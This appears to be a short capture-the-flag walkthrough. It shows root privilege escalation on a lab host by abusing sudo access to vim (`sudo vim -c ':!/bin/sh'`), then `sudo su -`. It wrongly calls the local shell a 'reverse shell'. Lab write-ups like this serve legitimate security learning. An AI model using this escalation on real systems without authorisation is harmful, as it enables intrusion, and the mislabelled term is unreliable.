We've been given SSH login credentials so we can remote login using

    ssh <username>@<hostname> -p <port>

now we can use `ls -la` to get the hidden file. Now we are supposed to use this somehow to get root privileges. But there is a simpler way to obtain privesc.

using,

    sudo -l

we can see that as a normal user, we have access to vim (as vi). Using the payload,

    sudo vim -c ':!/bin/sh'

we get a reverse shell and we can confirm we are root by typing `whoami`. Now we can run,

    sudo su -
to get root access. Now we can get the flag easily.
